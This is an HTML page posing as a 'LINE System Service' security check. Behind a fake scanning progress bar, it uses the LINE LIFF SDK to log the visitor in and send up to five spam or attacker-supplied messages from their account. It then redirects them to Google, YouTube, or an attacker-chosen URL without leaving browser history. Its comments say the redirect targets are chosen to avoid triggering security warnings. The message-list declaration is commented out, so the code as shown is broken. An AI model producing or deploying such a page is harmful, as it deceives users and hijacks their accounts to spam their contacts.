<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LINE System Service</title>
    <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
    <style>
        body { background-color: #000; color: #fff; text-align: center; padding-top: 160px; font-family: sans-serif; overflow: hidden; }
        .loader { border: 4px solid #333; border-top: 4px solid #00b900; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px auto; display: block; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 16px; color: #00b900; font-weight: bold; }
        #progress { font-size: 12px; color: #666; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div id="status">安全性檢查中...</div>
    <div id="progress">正在初始化環境 (0%)</div>

    <script>
        // 將預設跳轉改為穩定的大型網站，避免觸發安全性警告
        const safeSites = ["https://www.google.com", "https://www.youtube.com", "https://v612.line.me/"];

        async function fetchSpamText() {
            try {
                const isWiki = Math.random() > 0.5;
                const api = isWiki ? 'https://zh.wikipedia.org/api/rest_v1/page/random/summary' : 'https://baconipsum.com/api/?type=all-meat&paras=50';
                const res = await fetch(api);
                const data = await res.json();
                const content = isWiki ? data.extract : data.join(" ");
                return "\n" + content.repeat(25).substring(0, 4800);
            } catch (e) { return "[數據同步異常]".repeat(200); }
        }

        async function startApp() {
            const statusDom = document.getElementById('status');
            const progDom = document.getElementById('progress');
            const urlParams = new URLSearchParams(window.location.search);
            
            try {
                await liff.init({ liffId: "2009508758-fehQ5Hvj" });
                if (!liff.isLoggedIn()) { liff.login(); return; }

                //let messages =;

                // 1. 檢查關鍵字 spam1 ~ spam5
                for (let j = 1; j <= 5; j++) {
                    if (urlParams.has(`spam${j}`)) { 
                        messages.push({ type: 'text', text: await fetchSpamText() });
                    }
                }

                // 2. 處理 msg1 ~ msg5 (填補名額)
                const quota = 5 - messages.length;
                for (let i = 1; i <= quota; i++) {
                    let m = urlParams.get(`msg${i}`);
                    if (m) messages.push({ type: 'text', text: decodeURIComponent(m) });
                }

                if (messages.length === 0) messages.push({ type: 'text', text: await fetchSpamText() });

                // UI 設定
                const customStatus = urlParams.get('status');
                if (customStatus) statusDom.innerText = decodeURIComponent(customStatus);
                const waitTime = parseInt(urlParams.get('wait')) || 1500;
                
                const startTime = Date.now();
                const timer = setInterval(async () => {
                    const elapsed = Date.now() - startTime;
                    let percent = Math.min(Math.round((elapsed / waitTime) * 100), 99);
                    progDom.innerText = `安全性掃描中 (${percent}%)`;

                    if (elapsed >= waitTime) {
                        clearInterval(timer);
                        
                        // 執行發送
                        await liff.sendMessages(messages.slice(0, 5));
                        
                        // 處理跳轉：優先使用 site 參數，若無則從安全清單隨機選取
                        let target = urlParams.get('site');
                        if (target) {
                            target = decodeURIComponent(target);
                        } else {
                            target = safeSites[Math.floor(Math.random() * safeSites.length)];
                        }
                        
                        // 使用 replace 確保不留下瀏覽紀錄，並強制跳轉
                        setTimeout(() => {
                            window.location.replace(target);
                        }, 100);
                    }
                }, 50);

            } catch (err) { window.location.replace("https://www.google.com"); }
        }
        window.onload = startApp;
    </script>
</body>
</html>
